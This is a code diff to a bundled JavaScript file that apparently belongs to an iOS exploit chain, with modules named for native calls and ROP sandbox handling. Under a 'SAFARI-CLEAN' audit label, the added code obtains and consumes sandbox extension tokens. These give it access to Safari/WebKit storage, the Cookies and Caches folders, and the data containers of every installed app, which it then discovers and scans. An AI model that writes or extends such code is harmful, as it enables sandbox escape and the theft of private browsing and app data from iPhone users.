@@ -8724,11 +8724,26 @@ function runOptionalStage(label, enabled, fn) {
 function auditSafariOriginData() {
 	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 	const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
-	const MAX_SCAN_ENTRIES = 2500;
+	const MAX_SCAN_ENTRIES = 6000;
 	const MAX_CANDIDATE_LOGS = 200;
-	const roots = [
-		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/", depth: 8 },
+	const tokenPaths = [
+		"/private/var/mobile/Library/",
+		"/private/var/mobile/Library/WebKit/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/",
+		"/private/var/mobile/Library/Safari/",
+		"/private/var/mobile/Library/Caches/",
+		"/private/var/mobile/Library/Caches/com.apple.mobilesafari/",
+		"/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/",
+		"/private/var/mobile/Library/Caches/WebKit/",
+		"/private/var/mobile/Library/Cookies/",
+		"/private/var/mobile/Containers/Data/Application/",
+		"/var/mobile/Containers/Data/Application/",
+		"/private/var/mobile/Containers/Shared/AppGroup/"
+	];
+	let roots = [
+		{ path: "/private/var/mobile/Library/WebKit/", depth: 8 },
 		{ path: "/private/var/mobile/Library/Safari/", depth: 5 },
+		{ path: "/private/var/mobile/Library/Caches/", depth: 4 },
 		{ path: "/private/var/mobile/Library/Caches/com.apple.mobilesafari/", depth: 6 },
 		{ path: "/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
 		{ path: "/private/var/mobile/Library/Caches/WebKit/", depth: 6 },
@@ -8825,11 +8840,27 @@ function auditSafariOriginData() {
 		return Number(Native.callSymbol("access", path, 0n)) === 0;
 	}
 
+	function getErrno() {
+		let ep = Native.callSymbol("__error");
+		return ep ? Native.read32(BigInt(ep)) : -1;
+	}
+
 	function isDirPath(path, dType) {
 		if (dType === 4) return true;
 		if (dType === 8) return false;
 		let mode = statMode(path);
 		return (mode & 0xf000) === 0x4000;
+	}
+
+	function tokenForPath(path) {
+		let token = Sandbox.getTokenForPath(path, false);
+		if (!token) {
+			LOG("[SAFARI-CLEAN] token issue failed path=" + path);
+			return false;
+		}
+		let consumeRet = Native.callSymbol("sandbox_extension_consume", token);
+		LOG("[SAFARI-CLEAN] token consumed ret=" + consumeRet + " bytes=" + token.length + " path=" + path);
+		return true;
 	}
 
 	let origin = cleanString(globalThis.__ls_site_origin, 256);
@@ -8855,9 +8886,7 @@ function auditSafariOriginData() {
 		LOG("[SAFARI-CLEAN] note: Safari/WebKit website data is usually origin-scoped; path=" + sitePath + " may share storage with other pages on host=" + host);
 	}
 
-	for (let root of roots) {
-		Sandbox.getTokenForPath(root.path, true);
-	}
+	for (let tokenPath of tokenPaths) tokenForPath(tokenPath);
 
 	let scanned = 0;
 	let candidates = 0;
@@ -8896,7 +8925,7 @@ function auditSafariOriginData() {
 		}
 		let dir = Native.callSymbol("opendir", dirPath);
 		if (!dir) {
-			if (depth === 0) LOG("[SAFARI-CLEAN] root unavailable path=" + dirPath);
+			if (depth === 0) LOG("[SAFARI-CLEAN] root unavailable errno=" + getErrno() + " path=" + dirPath);
 			return;
 		}
 		try {
@@ -8919,6 +8948,61 @@ function auditSafariOriginData() {
 			Native.callSymbol("closedir", dir);
 		}
 	}
+
+	function rootExists(path) {
+		let dir = Native.callSymbol("opendir", path);
+		if (!dir) return false;
+		Native.callSymbol("closedir", dir);
+		return true;
+	}
+
+	function addRoot(path, depth) {
+		for (let root of roots) {
+			if (root.path === path) return;
+		}
+		roots.push({ path: path, depth: depth });
+		LOG("[SAFARI-CLEAN] discovered scan root path=" + path + " depth=" + depth);
+	}
+
+	function discoverAppContainerRoots(basePath) {
+		let dir = Native.callSymbol("opendir", basePath);
+		if (!dir) {
+			LOG("[SAFARI-CLEAN] app-container root unavailable errno=" + getErrno() + " path=" + basePath);
+			return;
+		}
+		let checked = 0;
+		let added = 0;
+		try {
+			while (checked < 180) {
+				let entPtr = Native.callSymbol("readdir", dir);
+				if (!entPtr) break;
+				let ent = readDirent(entPtr);
+				if (!ent || !ent.name || ent.name === "." || ent.name === "..") continue;
+				if (!isDirPath(basePath + ent.name, ent.type)) continue;
+				checked++;
+				let containerPath = basePath + ent.name + "/";
+				let candidates = [
+					{ path: containerPath + "Library/WebKit/", depth: 8 },
+					{ path: containerPath + "Library/Safari/", depth: 5 },
+					{ path: containerPath + "Library/Caches/", depth: 5 },
+					{ path: containerPath + "Library/Cookies/", depth: 3 }
+				];
+				for (let candidate of candidates) {
+					if (rootExists(candidate.path)) {
+						tokenForPath(candidate.path);
+						addRoot(candidate.path, candidate.depth);
+						added++;
+					}
+				}
+			}
+		} finally {
+			Native.callSymbol("closedir", dir);
+		}
+		LOG("[SAFARI-CLEAN] app-container discovery base=" + basePath + " checked=" + checked + " added=" + added);
+	}
+
+	discoverAppContainerRoots("/private/var/mobile/Containers/Data/Application/");
+	discoverAppContainerRoots("/var/mobile/Containers/Data/Application/");
 
 	for (let root of roots) {
 		scanDir(root.path, 0, root.depth);
